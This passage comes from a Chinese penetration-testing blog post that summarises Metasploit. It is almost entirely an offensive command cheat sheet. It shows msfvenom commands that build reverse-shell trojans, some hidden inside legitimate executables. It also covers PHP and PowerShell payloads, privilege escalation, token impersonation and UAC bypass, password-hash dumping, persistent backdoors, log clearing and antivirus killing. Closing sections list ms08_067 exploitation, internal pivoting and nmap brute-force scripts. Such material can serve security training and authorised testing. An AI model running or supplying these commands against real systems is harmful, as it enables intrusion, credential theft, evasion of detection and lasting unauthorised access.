+<h2 id="metasploit之木马生成"><a href="#metasploit之木马生成" class="headerlink" title="metasploit之木马生成"></a>metasploit之木马生成</h2><p>生成一个window木马返回shell   -p window平台正向链接 -e 编码 -b 字符列表 -f 平台</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp –e x86/shikata_ga_nai -b &apos;\x00&apos; -f python</span><br></pre></td></tr></table></figure>
+
+<p>两次弹框：payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/messagebox TEXT=MSFU Example -f raw &gt; messageBox</span><br><span class="line">msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT=“We are evil” -f raw &gt; messageBox2</span><br><span class="line">msfvenom -c messageBox2 -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.211.179 LPORT=4444  -f exe -o andy.exe</span><br></pre></td></tr></table></figure>
+
+<p>可以生成具有<code>网易云音乐</code>相同模板功能的木马exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -x 1.exe -k -p windows/meterpreter/reverse_tcp  LHOST=192.168.211.179 LPORT=4444  –b “\ x00” -f exe -o 2.exe</span><br></pre></td></tr></table></figure>
+
+<p>-k 保留exe的行为  -x 指定一个文件 -p 保留模版行为 -o 保留为2.exe</p>
+<h2 id="metasploit之powershell"><a href="#metasploit之powershell" class="headerlink" title="metasploit之powershell"></a>metasploit之powershell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set TARGET 2</span><br><span class="line">set LHOST 192.168.211.179</span><br><span class="line">set LPORT 4444</span><br><span class="line">set URIPATH /</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="metasploit之PHP"><a href="#metasploit之PHP" class="headerlink" title="metasploit之PHP"></a>metasploit之PHP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f raw &gt; shell.php</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD php/meterpreter_reverse_tcp</span><br><span class="line">set LHOST 172.17.150.246</span><br><span class="line">set LPORT 8888</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+
+<h2 id="metasploit之shellcode"><a href="#metasploit之shellcode" class="headerlink" title="metasploit之shellcode"></a>metasploit之shellcode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=1234 LHOST=60.205.212.140 -e x86/shikata_ga_nai -i 11 -f py &gt; 1.py //-e 使用编码 -i 编码次数</span><br></pre></td></tr></table></figure>
+
+<h1 id="metasploit之提权"><a href="#metasploit之提权" class="headerlink" title="metasploit之提权"></a>metasploit之提权</h1><p>1.getsystem</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法</span><br></pre></td></tr></table></figure>
+
+<p>2.使用exp提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background //先后台运行会话</span><br><span class="line">[*] Backgrounding session 1…</span><br><span class="line">msf &gt; use post/windows/escalate/ms10_073_kbdlayout</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set session 1 //设置要使用的会话</span><br><span class="line">msf post(ms10_073_kbdlayout) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>注意：如果创建了一个system进程，就可以立马<code>sessions 1</code>进入会话，然后ps查看进程，使用<strong>migrate pid</strong>注入到进程。<br>或者直接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/escalate/ms10_073_kbdlayout</span><br></pre></td></tr></table></figure>
+
+<p>3.盗取令牌</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito //进入这个模块</span><br><span class="line">meterpreter &gt; list_tokens –u //查看存在的令牌</span><br><span class="line">meterpreter &gt; impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠</span><br></pre></td></tr></table></figure>
+
+<p>注：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。</p>
+<p>4.Bypassuac</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set session 4</span><br><span class="line">msf &gt; run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权</span><br></pre></td></tr></table></figure>
+
+<p>5.Hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好。</span><br></pre></td></tr></table></figure>
+
+<p>6.漏洞提权的匹配</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">use exploit/windows/local/bypassuac_fodhelper</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/%E6%8F%90%E6%9D%83%E7%AF%87.png" alt></p>
+<h1 id="建立持久后门"><a href="#建立持久后门" class="headerlink" title="建立持久后门"></a>建立持久后门</h1><p>1.服务启动后门</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler //新终端中监听</span><br><span class="line">msf &gt; set payload windows/metsvc_bind_tcp</span><br><span class="line">msf &gt; set LPORT 31337</span><br><span class="line">msf &gt; set RHOST 192.168.0.128</span><br><span class="line">msf &gt; run //获取到的会话是system权限</span><br></pre></td></tr></table></figure>
+
+<p>2.persistence</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105</span><br><span class="line">-X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。</span><br></pre></td></tr></table></figure>
+
+<p>注意到移除 persistence 后门的办法是删除 <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>中的注册表键和 <code>C:\WINDOWS\TEMP\</code>中的<code>VBScript</code>文件。<br>缺点：容易被杀毒软件杀 。</p>
+<ol start="3">
+<li>清除记录</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; clearev //删除目标机上的应用程序、系统和安全日志。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Meterpreter域渗透"><a href="#Meterpreter域渗透" class="headerlink" title="Meterpreter域渗透"></a>Meterpreter域渗透</h1><h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run get_local_subnets #查看网段/子网</span><br><span class="line">Local subnet: 192.168.33.0/255.255.255.0</span><br><span class="line">meterpreter&gt; background #转入后台运行</span><br><span class="line">msf&gt; route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息</span><br><span class="line">msf&gt; route print #查看添加的信息</span><br><span class="line">msf&gt; use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻</span><br><span class="line">set payload linux/x86/shell/reverse_tcp</span><br><span class="line">set LHOST 10.10.1.129 #此处为attacking 主机的外网IP</span><br><span class="line">set LPORT 8080</span><br><span class="line">set RHOST 192.168.33.132 #内网目标主机</span><br><span class="line">exploit</span><br><span class="line">也可以使用自动式添加路由模块：</span><br><span class="line">msf&gt; load auto_add_route</span><br><span class="line">msf&gt; exploit</span><br></pre></td></tr></table></figure>
+
+<h2 id="Meterpreter-脚本"><a href="#Meterpreter-脚本" class="headerlink" title="Meterpreter 脚本"></a>Meterpreter 脚本</h2><p>1.vnc 脚本,获取远程机器vnc 界面控制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run vnc</span><br><span class="line">meterpreter&gt; run screen_unlock</span><br></pre></td></tr></table></figure>
+
+<p>2.进程迁移</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/manage/migrate</span><br><span class="line">//在64 位win7 中migrate 需要管理员权限执行后门才能成功，而migrate 前后获取的</span><br></pre></td></tr></table></figure>
+
+<p>在64 位win7 中migrate 需要管理员权限执行后门才能成功，而migrate 前后获取的 权限是有差异的</p>
+<p>3.关闭杀毒软件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run killav //这个脚本要小心使用，可能导致目标机器蓝屏死机</span><br></pre></td></tr></table></figure>
+
+<p>4.获取系统密码hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run hashdump //64 位win7 下需要管理员权限执行后门且先getsystem，然后使用</span><br><span class="line">run post/windows/gather/hashdump 来dump hash 成功率更高</span><br></pre></td></tr></table></figure>
+
+<p>5.获取系统流量数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run packtrecorder –i 1</span><br></pre></td></tr></table></figure>
+
+<p>6.获取密码，下载注册表，获取系统信息等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run scraper</span><br></pre></td></tr></table></figure>
+
+<p>7.持久化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run persistence –X –i 50 –p 443 –r 192.168.1.111</span><br></pre></td></tr></table></figure>
+
+<p>-X 开机启动-i 连接超时时间–p 端口–rIP</p>
+<p>8.POST 整合模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/gather/hashdump</span><br></pre></td></tr></table></figure>
+
+<p>9.升级command shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf&gt; search ms08_067</span><br><span class="line">msf&gt; use windows/smb/ms08_067_netapi</span><br><span class="line">set PAYLOAD windows/shell/reverse_tcp</span><br><span class="line">set TARGET 3</span><br><span class="line">setg LHOST 192.168.1.111</span><br><span class="line">setg LPORT 8080</span><br><span class="line">exploit –z #后台运行，如果此处未使用-z 参数，后面可以按CTRL-Z 转到后台</span><br><span class="line">sessions –u 1 #升级shell，必须前面使用setg 设定</span><br><span class="line">sessions –i 2</span><br></pre></td></tr></table></figure>
+
+<p>10.使用Railgun 操作windows APIs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; irb</span><br><span class="line">client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”)</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上会弹出一个标题栏为world 和内容为hello 的窗口</p>
+<h1 id="Metasploit结合Nmap-lua语言"><a href="#Metasploit结合Nmap-lua语言" class="headerlink" title="Metasploit结合Nmap(lua语言)"></a>Metasploit结合Nmap(lua语言)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 3389 -oG- 221.0.90.0/24 | grep open     显示3389端口开放的主机</span><br><span class="line">nmap --script=default 192.168.211.137         搜集各种应用服务的信息</span><br><span class="line">nmap --script=vuln 192.168.211.137</span><br><span class="line">nmap --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.211.137  smb已知几个严重漏洞</span><br><span class="line">nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=&quot;net user&quot; 192.168.137.4  xp_cmdshell 执行命令</span><br><span class="line">nmap -p 1433 --script ms-sql-dump-hashes.nse --script-args mssql.username=sa,mssql.password=sa  192.168.137.4  dumphash值</span><br><span class="line">nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4 列出所有mysql用户</span><br><span class="line">nmap -sT -PN –spoof-mac aa:bb:cc:dd:ee:ff target    MAC地址欺骗</span><br><span class="line">nmap -p80 --script http-brute --script-args http-brute.path=/admin/ &lt;target&gt;暴力破解HTTP身份认证</span><br><span class="line">nmap -p80 --script http-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt &lt;target&gt;    使用自定义的字典</span><br><span class="line">nmap --script http-brute --script-args brute.mode=user &lt;target&gt;用户模式：该模式下，对于userdb中的每个user,会尝试passdb里面的每个password</span><br><span class="line">nmap --script http-brute --script-args brute.mode=pass &lt;target&gt;   密码模式：该模式下，对于passdb中的每个password,会尝试userdb里面的每个user</span><br><span class="line">nmap -p80 --script http-default-accounts &lt;target&gt;   测试默认凭据</span><br><span class="line">nmap -p80 --script http-wordpress-brute --script-args http-wordpressbrute.threads=5 &lt;target&gt;   WordPress审计</span><br><span class="line">nmap -p80 --script http-joomla-brute &lt;target&gt;   Joomla审计</span><br><span class="line">nmap -p80 --script http-waf-detect --script-args=”http-waf-detect.aggro” &lt;target&gt;检测Web应用防火墙</span><br><span class="line">nmap -p80 --script http-unsafe-output-escaping &lt;target&gt;     检测跨站脚本漏洞</span><br><span class="line">nmap -p80 --script http-sql-injection &lt;target&gt;      检测SQL注入</span><br><span class="line">nmap -p80 --script http-sql-injection --script-args http.useragent=”Mozilla 42″ &lt;target&gt;    同样可以设置User Agent和HTTP管道的数目</span><br><span class="line">nmap -sV --script=mysql-databases --script-args mysqluser=root,mysqlpass=toor 192.168.195.130   列出数据库名称</span><br><span class="line">nmap -sV --script=mysql-users 192.168.195.130   用户审计</span><br><span class="line">sudo nmap --script mysql-empty-password 192.168.195.130     检查root空口令</span><br><span class="line">nmap --script=mysql-brute localhost     暴力破解</span><br><span class="line">nmap --script=mysql-info localhost      Mysql信息</span><br><span class="line">nmap -p25 -Pn --script smtp-brute target        暴力破解SMTP密码</span><br><span class="line">nmap -p80 --script=http-email-harvest target    谷歌搜索发现有效的电子邮件帐户</span><br><span class="line">nmap –script=mysql-vuln-cve2012-2122 localhost      使用CVE-2012-2122</span><br></pre></td></tr></table></figure>
+
+<p>漏洞银行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=struts_02-045.nse --script-args filename=***.jsp 192.168.211.137  查看某个网页有没有shell</span><br><span class="line">nmap -p80,139,445 --script=smb-vul*</span><br><span class="line">开始扫描→→主机发现→→端口扫描→→版本侦查→→OS侦测（系统）</span><br><span class="line">主机发现：采用不同判断方式</span><br><span class="line">端口扫描：通过正则匹配对比指纹</span><br><span class="line">版本侦测：通过侦测banner（也就是状态码）</span><br><span class="line">OS侦测  ：nmap-os-db</span><br><span class="line">Nmap Engine</span><br><span class="line">开始扫描→→主机发现→→端口扫描→→nse脚本→→动作处理</span><br></pre></td></tr></table></figure>
+
+<p>嘶吼</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/nmap/scripts/   Nmap脚本目录</span><br><span class="line">ls vulscan/*.csv  vulscan目录的根目录中查看这些数据库</span><br><span class="line">cd /usr/share/nmap/scripts/utilities/updater/  ./updateFiles.sh  更新数据库</span><br><span class="line">nmap --script nmap-vulners -sV &lt;目标IP&gt;     Nmap-Vulners进行扫描</span><br><span class="line">nmap --script vulscan -sV &lt;目标IP&gt;    使用Vulscan进行扫描</span><br><span class="line">nmap --script vulscan --script-args vulscandb=database_name -sV &lt;目标IP&gt;</span><br><span class="line">nmap --script vulscan --script-args vulscandb=scipvuldb.csv -sV &lt;目标IP&gt;</span><br><span class="line">nmap --script vulscan --script-args vulscandb=exploitdb.csv -sV &lt;目标IP&gt;</span><br><span class="line">nmap --script vulscan --script-args vulscandb=securitytracker.csv -sV &lt;目标IP&gt;</span><br><span class="line">nmap --script=http-vuln-cve2017-5638.nse 192.168.211.137</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/08/30/Metasploit总结-持续更新/" title="Metasploit总结--持续更新">https://wh0ale.github.io/2019/08/30/Metasploit总结-持续更新/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/Meterpreter/" rel="tag"><i class="fa fa-tag"></i># Meterpreter</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/08/29/openssl加密shell/" rel="next" title="openssl加密shell">
+                <i class="fa fa-chevron-left"></i> openssl加密shell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/09/01/PHP-Audit-Labs-Day11-unserialize反序列化漏洞/" rel="prev" title="PHP-Audit-Labs-Day11-unserialize反序列化漏洞">
+                PHP-Audit-Labs-Day11-unserialize反序列化漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#常用命令"><span class="nav-number">1.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞扫描"><span class="nav-number">2.</span> <span class="nav-text">漏洞扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检测端口服务"><span class="nav-number">2.1.</span> <span class="nav-text">检测端口服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mssql开发利用"><span class="nav-number">2.2.</span> <span class="nav-text">mssql开发利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破ssh模块"><span class="nav-number">2.3.</span> <span class="nav-text">爆破ssh模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过nmap扫描基本漏洞"><span class="nav-number">2.4.</span> <span class="nav-text">通过nmap扫描基本漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#445端口扫描系统信息"><span class="nav-number">2.5.</span> <span class="nav-text">445端口扫描系统信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#密码嗅探"><span class="nav-number">2.6.</span> <span class="nav-text">密码嗅探</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SNMP扫描和枚举"><span class="nav-number">2.7.</span> <span class="nav-text">SNMP扫描和枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VNC身份验证"><span class="nav-number">2.8.</span> <span class="nav-text">VNC身份验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FTP-主机扫描"><span class="nav-number">2.9.</span> <span class="nav-text">FTP 主机扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#扫描FTP-匿名登录"><span class="nav-number">2.10.</span> <span class="nav-text">扫描FTP 匿名登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VNC-空口令"><span class="nav-number">2.11.</span> <span class="nav-text">VNC 空口令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Open-X11-空口令"><span class="nav-number">2.12.</span> <span class="nav-text">Open X11 空口令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#溢出漏洞"><span class="nav-number">3.</span> <span class="nav-text">溢出漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ms08-067"><span class="nav-number">3.1.</span> <span class="nav-text">ms08_067</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ms12-004"><span class="nav-number">3.2.</span> <span class="nav-text">ms12_004</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ms14-002内核提权（使用于32bit）"><span class="nav-number">3.3.</span> <span class="nav-text">ms14_002内核提权（使用于32bit）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用用户端攻击方式-client-side-attacks"><span class="nav-number">3.4.</span> <span class="nav-text">使用用户端攻击方式(client-side attacks)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Meterpreter-Payload"><span class="nav-number">4.</span> <span class="nav-text">Meterpreter Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit安卓木马远控"><span class="nav-number">4.1.</span> <span class="nav-text">metasploit安卓木马远控</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit之木马生成"><span class="nav-number">4.2.</span> <span class="nav-text">metasploit之木马生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit之powershell"><span class="nav-number">4.3.</span> <span class="nav-text">metasploit之powershell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit之PHP"><span class="nav-number">4.4.</span> <span class="nav-text">metasploit之PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit之shellcode"><span class="nav-number">4.5.</span> <span class="nav-text">metasploit之shellcode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" 